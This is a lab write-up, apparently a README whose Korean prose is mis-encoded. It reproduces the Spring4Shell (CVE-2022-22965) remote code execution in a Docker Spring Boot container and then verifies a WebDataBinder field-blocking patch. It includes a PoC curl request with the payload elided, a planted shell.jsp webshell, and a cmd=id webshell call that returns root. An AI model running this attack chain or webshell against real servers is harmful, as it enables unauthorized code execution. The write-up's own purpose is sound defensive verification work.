# CVE-2022-22965 â€“ Spring4Shell RCE ì¬í˜„ ë° íŒ¨ì¹˜ ê²€ì¦

Spring Frameworkì˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì¸ **CVE-2022-22965(Spring4Shell)** ì„  
Docker ê¸°ë°˜ Spring Boot í™˜ê²½ì—ì„œ ì‹¤ì œë¡œ ì¬í˜„í•˜ê³ ,  
RCE ì„±ê³µ ë° íŒ¨ì¹˜ ì ìš© ì´í›„ ì°¨ë‹¨ ì—¬ë¶€ê¹Œì§€ ì „ ê³¼ì •ì„ ê²€ì¦í•œ ë¶„ì„ ë¬¸ì„œì…ë‹ˆë‹¤.

ë³¸ í…ŒìŠ¤íŠ¸ëŠ” Spring Boot 2.6.x + Spring Framework 5.3.x ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‚¬ìš©í•´  
Spring4Shellì˜ ì‹¤ì œ ì•…ìš© ê°€ëŠ¥ì„±ê³¼ íŒ¨ì¹˜ íš¨ê³¼ë¥¼ ì‹¤í—˜ì ìœ¼ë¡œ í™•ì¸í•˜ëŠ” ë° ì´ˆì ì„ ë‘ì—ˆìŠµë‹ˆë‹¤.

---

## âœ” 1. ì‹¤í—˜ í™˜ê²½ êµ¬ì„±

í…ŒìŠ¤íŠ¸ í™˜ê²½ì€ ì•„ë˜ì™€ ê°™ì´ êµ¬ì„±í–ˆìŠµë‹ˆë‹¤:

- Spring Boot **2.6.5**
- Spring Framework **5.3.17**
- OpenJDK **11.0.14.1**
- Tomcat 9.x (embedded)
- Docker ê¸°ë°˜ ì»¨í…Œì´ë„ˆ ì‹¤í–‰

ì»¨í…Œì´ë„ˆ ê¸°ë™ ì‹œ ì¶œë ¥ë˜ëŠ” Spring Boot ë°°ë„ˆ:

![spring boot banner](images/springboot-banner.png)

---

## âœ” 2. ì‹¤ì œ Spring / Java ë²„ì „ ê²€ì¦

ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ Java ë²„ì „ì„ í™•ì¸í•œ ê²°ê³¼:

openjdk version "11.0.14.1"
OpenJDK Runtime Environment 18.9


![java version](images/java-version.png)

Spring ë¼ì´ë¸ŒëŸ¬ë¦¬ ëª©ë¡:

spring-aop-5.3.17.jar
spring-beans-5.3.17.jar
spring-core-5.3.17.jar
spring-webmvc-5.3.17.jar
spring-boot-2.6.5.jar


![spring libs](images/spring-libs.png)

`pom.xml` ì„¤ì •(ì·¨ì•½ ë²„ì „ í™•ì¸):

![pom xml](images/pom-version.png)

---

## âœ” 3. Docker ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹¤í–‰ ìƒíƒœ

ì»¨í…Œì´ë„ˆê°€ ì •ìƒì ìœ¼ë¡œ ì˜¬ë¼ì˜¨ ìƒíƒœ:

CONTAINER ID IMAGE COMMAND PORTS
xxxxx spring4shell "catalina.sh run" 0.0.0.0:9090->8080/tcp


![docker ps](images/docker-ps.png)

---

## âœ” 4. Spring4Shell PoC ê³µê²© ìˆ˜í–‰

Spring4Shell ê³µê²©ì€ WebDataBinderê°€ ì²˜ë¦¬í•˜ëŠ” property pathë¥¼ ì¡°ì‘í•˜ì—¬  
**Tomcat AccessLogValve ì„¤ì •ì„ ë‚´ ë§ˆìŒëŒ€ë¡œ ë®ì–´ì“°ëŠ” ë°©ì‹**ìœ¼ë¡œ ìˆ˜í–‰ëœë‹¤.

PoC êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ë‹¤ (IP ì œê±°ë¨):

curl -X POST http://[TARGET]/demo/itsecurityco
-H "Content-Type: application/x-www-form-urlencoded"
--data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=..."


![poc request](images/poc-request.png)

ìš”ì²­ ê²°ê³¼ëŠ” WhiteLabel Error Page í˜•íƒœì§€ë§Œ  
ì´ ì‹œì ì—ì„œ **ë‚´ë¶€ì ìœ¼ë¡œ AccessLogValve overrideê°€ ì´ë¯¸ ìˆ˜í–‰ëœ ìƒíƒœ**ì´ë‹¤.

---

## âœ” 5. JSP ì›¹ì…¸ ìƒì„± í™•ì¸

ê³µê²©ì´ ì„±ê³µí–ˆë‹¤ë©´ Tomcat ROOT ë””ë ‰í† ë¦¬ì— `shell.jsp`ê°€ ìƒì„±ëœë‹¤.

docker exec -it spring4shell ls /usr/local/tomcat/webapps/ROOT
shell.jsp


![shell jsp generated](images/shelljsp-generated.png)

ìƒì„±ëœ JSP ì›¹ì…¸ ë‚´ìš© í™•ì¸:

![shell jsp content](images/shelljsp-content.png)

í•´ë‹¹ JSPëŠ” ìš”ì²­ íŒŒë¼ë¯¸í„° `cmd` ê°’ì„ OS ëª…ë ¹ìœ¼ë¡œ ì‹¤í–‰í•˜ê³  ê·¸ ê²°ê³¼ë¥¼ ì¶œë ¥í•œë‹¤.

---

## âœ” 6. RCE ìˆ˜í–‰ ê²°ê³¼ (ì„±ê³µ)

ì›¹ì…¸ì„ í†µí•´ OS ëª…ë ¹ ì‹¤í–‰ í…ŒìŠ¤íŠ¸:

curl "http://[TARGET]/shell.jsp?cmd=id"


ë°˜í™˜ ê²°ê³¼:

uid=0(root) gid=0(root) groups=0(root)


![rce id result](images/rce-id-result.png)

â†’ **root ê¶Œí•œ ëª…ë ¹ ì‹¤í–‰ ì„±ê³µ â†’ RCE ì™„ë²½í•˜ê²Œ ì¬í˜„ë¨**

---

## âœ” 7. íŒ¨ì¹˜ ì ìš© í›„ ì¬ê³µê²© í…ŒìŠ¤íŠ¸ (ì°¨ë‹¨ë¨)

Spring ê³µì‹ ê°€ì´ë“œì— ë”°ë¼ WebDataBinder ìœ„í—˜ í•„ë“œ ì ‘ê·¼ì„ ì°¨ë‹¨í•˜ê¸° ìœ„í•´  
ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ì ìš©:

```java
@ControllerAdvice
public class GlobalBindingConfig {

    @InitBinder
    public void configureBinding(WebDataBinder binder) {
        binder.setDisallowedFields(
                "class.*",
                "Class.*",
                "module.*",
                "classLoader.*",
                "*.classLoader",
                "*.module",
                "*.class"
        );
    }
}

ì´í›„ ë™ì¼ PoC ì¬ìˆ˜í–‰:

JSP ìƒì„± ì‹¤íŒ¨ ë° 404 ì‘ë‹µ:

ê²°ê³¼:

JSP ìƒì„± ë¶ˆê°€

AccessLogValve override ì°¨ë‹¨

RCE ì¬í˜„ ë¶ˆê°€

â†’ íŒ¨ì¹˜ ì ìš© ì‹œ ì·¨ì•½ì ì´ ì™„ì „íˆ ì°¨ë‹¨ë¨ì„ í™•ì¸
```
---

âœ” 8. ìµœì¢… ê²°ë¡ 

ë³¸ ì‹¤í—˜ì„ í†µí•´ ë‹¤ìŒ ì‚¬ì‹¤ì„ ëª…í™•íˆ ê²€ì¦í•  ìˆ˜ ìˆì—ˆë‹¤:

ğŸ”¥ (1) Spring Boot 2.6.5 + Spring 5.3.17 í™˜ê²½ì€ Spring4Shell ì˜í–¥ ëŒ€ìƒ
ğŸ”¥ (2) PoC ê³µê²©ì„ í†µí•´ ì‹¤ì œë¡œ JSP ì›¹ì…¸ ìƒì„± ë° RCE ì„±ê³µ
ğŸ”¥ (3) WebDataBinder í•„ë“œ ì°¨ë‹¨ íŒ¨ì¹˜ ì ìš© í›„ ë™ì¼ ê³µê²© ì™„ì „ ì°¨ë‹¨
ğŸ”¥ (4) AccessLogValve override â†’ JSP ìƒì„± â†’ OS ëª…ë ¹ ì‹¤í–‰ íë¦„ì´ ì‹¤ì „ê³¼ ë™ì¼í•˜ê²Œ í™•ì¸ë¨

ì¦‰, Spring4Shellì€ ì¡°ê±´ë§Œ ê°–ì¶°ì§€ë©´ ì¦‰ì‹œ RCEë¡œ ì§ê²°ë˜ëŠ” ê³ ìœ„í—˜ ì·¨ì•½ì ì´ë©°,
Spring Framework íŒ¨ì¹˜ ë° ë°”ì¸ë”© í•„í„°ë§ ì •ì±… ì ìš© ì‹œ ì‹¤ì§ˆì ì¸ ëŒ€ì‘ì´ ê°€ëŠ¥í•¨ì„ ì‹¤í—˜ì ìœ¼ë¡œ í™•ì¸í–ˆë‹¤.



